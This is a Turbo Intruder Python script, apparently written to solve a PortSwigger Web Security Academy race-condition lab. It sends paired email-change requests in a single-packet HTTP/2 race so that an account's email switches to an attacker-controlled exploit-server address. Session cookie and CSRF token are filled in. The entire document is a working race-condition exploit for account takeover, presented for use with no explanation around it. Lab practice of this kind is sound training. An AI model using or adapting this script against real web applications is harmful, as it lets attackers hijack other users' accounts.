def queueRequests(target, wordlists):

    # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='https://0a42001c0317e004818067a400ec00df.web-security-academy.net',
                           concurrentConnections=2,
                           engine=Engine.BURP2
                           )

    req1 = r'''POST /my-account/change-email HTTP/2
Host: 0a42001c0317e004818067a400ec00df.web-security-academy.net
Cookie: session=cAhcha6g96y4nQ9gSHqnY9wajrh5YvtH
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: https://0a42001c0317e004818067a400ec00df.web-security-academy.net
Referer: https://0a42001c0317e004818067a400ec00df.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

email=wiener%40exploit-0ad6004303e1e0dd8139668a01bc0073.exploit-server.net&csrf=FbRPm2l03nO7Kv9mTSdDGal0fFDCPCtH'''

    req2 = r'''POST /my-account/change-email HTTP/2
Host: 0a42001c0317e004818067a400ec00df.web-security-academy.net
Cookie: session=cAhcha6g96y4nQ9gSHqnY9wajrh5YvtH
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://0a42001c0317e004818067a400ec00df.web-security-academy.net
Referer: https://0a42001c0317e004818067a400ec00df.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

email=carlos%40ginandjuice.shop&csrf=FbRPm2l03nO7Kv9mTSdDGal0fFDCPCtH'''

    
    
    for i in range(8):
        engine.queue(req1, gate='race1')
        engine.queue(req2, gate='race1')
        #send both email reset requests at the same time, staggered
        
    #engine.openGate('race0')
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)

